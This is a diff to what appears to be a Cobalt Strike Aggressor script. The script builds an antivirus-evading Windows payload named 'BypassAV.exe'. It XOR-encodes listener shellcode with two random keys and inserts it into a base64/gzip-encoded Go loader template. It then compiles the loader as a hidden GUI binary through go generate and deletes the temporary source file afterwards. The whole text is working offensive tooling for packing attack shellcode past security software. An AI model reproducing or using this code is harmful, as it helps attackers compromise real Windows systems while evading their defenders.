@@ -17,31 +17,51 @@ sub Generator{
 }
 
 sub build{
-	if ($3["bit"]){
-		$system = "x64";
-	}else{
-		$system = "x86";
-	}
-	$code = gunzip(base64_decode("H4sIAAAAAAAAAL2TX2/TMBTFn7tPcYmmytGiKAs8AX2oOoMmGlF1ZYCmEpnEYdZcO3Ic1Gjw3bGdv4Xtlahq7NvfufY5dkuSPZAfFA6EibOz2YwdSqk0IDOceVVTZYRzz01qUZGC2rFvwUyKquMSnKSrj0lyvYPps4DoeBlFUY9s8Q3e3uK/kbhDNsv3OMVf8OrTDht2efV5e73DDnnlgA/4a3oJ/zwLOHe/9Ej8LBL3e/9JVLvzB6oE5S/jHusMh0ld6bUk+dV6jbweCnMThW9lQpvhpPuTMgeNmlumdE34knOZWc3Q1YreMZFvlMyQN8Va4VbzlSybhB6kaoyw7XuqOmGczPksapG5k0U+PNpe54/VPeU8kzn9bec2iKECd/vvjaa2XkgFDF6b7N+Y91vgVKCjVOnA+qZ+cdE2nY0dFkDKkoocDaUATnR3bP/NnZb7jp1BtxOS5yqANACqlF14mkO4MuGiKICaCV1qhex2xq34AYw38NfkpgXw9J1yq7LCLfXCBMo4zOd2FmKlpDJhmaq3u6cgS6qIZlJAJg8lp5rmUNVZRquqqDlvQq+PoLsB+Mg0ikZb6eBpASeH1HpqXaPOl4/a/1i4kaZAFZqPuUV76/OZAP6job5+0747B9HwsaQF/wAUTNiyWAQAAA=="));
+	$a = $3["bit"] . "";
 
+	if ($3["bit"] eq "false"){
+		$system = "x86";
+		$arch = "386";
+	}else{
+		$system = "x64";
+		$arch = "amd64";
+	}
+
+	$code = gunzip(base64_decode("H4sIAAAAAAAACr1TUW/aMBB+xr/iFiHkrFGasu2lGw+IelVVsiJg3aaKRVliqFVjR05SgRj/fecEAmzt66wots/fd77v7pzFyVO84LCMhSKkvbm++8LG/SnbkvPzhb5ccMVNXHDIH7mUhIhlpk0BlLScfJ0nsZQOLkuVx3NuV4VY4uwSkmiVV7iQhdHgLgxvpnA8ehCsLoIgqAFjNmHje/Y3oFsBRv1rFrHvbPB1yhDZv/o2vpmyCvAej2/Zj+gC/hk9aG+qo20N6b4O6W5txM+xsfE+caO4fNfdQ3Yy/bDMi6GO06vhkDp7kJ9iAlzSUgUujvy+SKpAe8a9MEUZy76UOrGMxqOlfBYqHRmdUOcYZmnjQg50tg75Ups10mqfpxzEhPqZ1xgkobZ5qZKqxNSFDWm1N1U5E51yzI4V3uzhYfZrXXDSmmsDAi4xyx9x/gSSK7rSJmqQLtrPzqy71oHdgzjLuEppY/LghPUgZj+rslT/LkrCCOI0NR5EHnBj7JXHqv0BJpIGHpRCFVlhqA3kEITrwaHDfh/1kgcv9w3eKObVRW8wfUJCp2N3PjNGG0wPWp3pIwed2cYXWkGil5nkBU8hL5OE5/m8lHLtO7X0XaXZShQ0qOVEjZYenBSs1lKrpTs9Lq1fjz/SaOCGdg65CmZW3yvC/4MQ+5r9ieQ8ox/gLdRbjk87xfM9YVLPO1lB87lk+weKv0dCXQQAAA=="));
 	$KEY_1 = rand(255);
 	$KEY_2 = rand(255);
-	$code = replace($code, '\$KEY_1', $KEY_1);
-	$code = replace($code, '\$KEY_2', $KEY_2);
+	$code = replace($code, '\$\{KEY_1\}', $KEY_1);
+	$code = replace($code, '\$\{KEY_2\}', $KEY_2);
 	$shell_code = shellcode($3["listener"], false, $system);
 	$shell_code = split("",$shell_code);
 	$arr = "";
+
 	for ($i = 0; $i < size($shell_code); $i++){
 		$arr = $arr . "," .asc($shell_code[$i]) ^ $KEY_1 ^ $KEY_2;
 	}
+
 	$final_shellcode = "xor_shellcode :=[]byte" . "{" . substr($arr,1,strlen($arr)) . "}";
 	$code = replace($code , '\$\{shellcode\}' , $final_shellcode);
 
 	prompt_file_save("BypassAV.exe", {
-		$handle = openf(">temp.go");
+		$path = "$1";
+
+		if ("*Windows*" iswm systemProperties()["os.name"]) {
+			$path = replace($path, "\\\\", "\\\\\\\\");
+			$build = "//go:generate -command shell cmd /c set GOOS=windows&& set GOARCH= $+ $arch $+ && go build -o $path -ldflags -H=windowsgui C:\\\\windows\\\\temp\\\\temp.go && del C:\\\\windows\\\\temp\\\\temp.go";
+			$gofile = "C:\\\\windows\\\\temp\\\\temp.go";
+			$handle = openf("> $+ $gofile");
+		}else{
+			$build = "//go:generate -command shell bash -c \"GOOS=windows&& GOARCH= $+ $arch && go build -o $path -ldflags -H=windowsgui /tmp/temp.go && rm /tmp/temp.go\"";
+			$gofile = "/tmp/temp.go";
+			$handle = openf("> $+ $gofile");
+		}
+
+		$code = replace($code, '\$\{GONERATE\}', $build);
 		writeb($handle, $code);
 		closef($handle);
-		exec("go build -o  $+ $1 temp.go");
+		$space = " ";
+		exec("go generate $+ $space $+ $gofile");
 		show_message("save to  $+ $1");
     });
 
